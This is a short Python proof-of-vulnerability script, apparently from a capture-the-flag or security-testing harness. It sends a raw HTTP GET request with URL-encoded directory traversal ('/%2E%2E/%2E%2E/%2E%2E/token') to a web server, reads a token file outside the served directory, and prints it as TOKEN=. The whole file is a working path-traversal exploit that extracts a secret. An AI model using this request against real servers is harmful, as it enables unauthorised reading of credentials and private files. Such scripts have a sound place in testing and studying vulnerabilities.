#!/usr/bin/env python3
import os
import socket
import sys
import re

HOST = os.getenv('HOST', '127.0.0.1')
PORT = os.getenv('PORT', '8080')
#TOKEN = os.getenv('TOKEN')

# if not TOKEN:

#     print("Missing TOKEN environment variable")
#     sys.exit(-1)

REQUEST = 'GET /%2E%2E/%2E%2E/%2E%2E/token HTTP/1.1\r\nHost: {}\r\n\r\n'.format(HOST).encode()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

    response = b''

    sock.connect((HOST, int(PORT)))
    sock.sendall(REQUEST)

    while True:

        data = sock.recv(1024)

        if data == b'':
            break

        response += data

print(response, file=sys.stderr)

if b"HTTP/1.1 404 Not Found" in response:
    print("looks like PoV failed", file=sys.stderr)
    sys.exit(-1)

response_body_match = response.split(b"\r\n")[-1].strip()

print("TOKEN={0}".format(str(response_body_match, errors='ignore')))

# if TOKEN.encode() in response:
#     print("PoV was successful")
#     sys.exit(0)
# else:
#     print("PoV was NOT successful")
#     sys.exit(-1)
